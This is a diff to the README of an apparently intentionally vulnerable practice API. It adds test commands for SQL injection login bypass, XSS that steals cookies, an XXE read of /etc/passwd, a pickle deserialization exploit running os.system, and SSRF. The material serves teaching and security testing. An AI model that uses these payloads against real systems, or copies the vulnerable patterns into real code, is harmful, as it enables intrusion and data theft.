@@ -120,17 +120,109 @@ python main.py
 
 The API will be available at `http://localhost:5000`
 
-## API Endpoints
+## Testing Vulnerabilities
 
-- POST `/login` - Authentication endpoint
-- GET `/posts/<id>` - Retrieve posts
-- GET `/users` - List all users
-- GET `/search` - Search functionality
-- POST `/notes` - Add notes
-- GET `/notes/<user_id>` - View notes
-- POST `/process-xml` - Process XML data
-- POST `/deserialize` - Process serialized data
-- GET `/fetch-url` - Fetch external URLs
+This application is designed for testing various vulnerabilities. Below are the instructions for testing each vulnerability.
+
+### 1. SQL Injection
+**Endpoint**: `/login`
+
+**Test Case**:
+- Normal login:
+  ```bash
+  curl -X POST http://localhost:5000/login -H "Content-Type: application/json" -d '{"username": "admin", "password": "password"}'
+  ```
+
+- SQL Injection attack:
+  ```bash
+  curl -X POST http://localhost:5000/login -H "Content-Type: application/json" -d '{"username": "admin\' --", "password": "anything"}'
+  ```
+
+### 2. Broken Object Level Authorization
+**Endpoint**: `/posts/<int:post_id>`
+
+**Test Case**:
+- Access a post without authentication:
+  ```bash
+  curl http://localhost:5000/posts/1
+  ```
+
+### 3. Excessive Data Exposure
+**Endpoint**: `/users`
+
+**Test Case**:
+- Retrieve all user data including passwords:
+  ```bash
+  curl http://localhost:5000/users
+  ```
+
+### 4. Reflected XSS
+**Endpoint**: `/search`
+
+**Test Case**:
+- Test for reflected XSS:
+  ```bash
+  curl "http://localhost:5000/search?q=<script>alert('XSS')</script>"
+  ```
+
+### 5. Stored XSS
+**Endpoint**: `/notes`
+
+**Test Case**:
+- Store a malicious script:
+  ```bash
+  curl -X POST http://localhost:5000/notes -H "Content-Type: application/json" -d '{"note": "<script>alert(document.cookie)</script>"}'
+  ```
+
+- View the note (in browser):
+  ```bash
+  http://localhost:5000/notes/1
+  ```
+
+### 6. XXE Vulnerability
+**Endpoint**: `/process-xml`
+
+**Test Case**:
+- XXE attack to read local files:
+  ```bash
+  curl -X POST http://localhost:5000/process-xml -H "Content-Type: application/xml" -d '<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+  <foo>&xxe;</foo>'
+  ```
+
+### 7. Insecure Deserialization
+**Endpoint**: `/deserialize`
+
+**Test Case**:
+- Create a malicious payload (save as `exploit.py`):
+  ```python
+  import pickle
+  import base64
+  import os
+
+  class Exploit:
+      def __reduce__(self):
+          return (os.system, ('id',))
+
+  # Generate the payload
+  payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+  print(payload)
+  ```
+
+- Use the generated payload:
+  ```bash
+  curl -X POST http://localhost:5000/deserialize -H "Content-Type: application/json" -d "{\"data\": \"YOUR_GENERATED_PAYLOAD\"}"
+  ```
+
+### 8. SSRF Vulnerability
+**Endpoint**: `/fetch-url`
+
+**Test Case**:
+- Access internal network:
+  ```bash
+  curl "http://localhost:5000/fetch-url?url=http://localhost:5000/users"
+  ```
 
 ## Educational Purpose
 
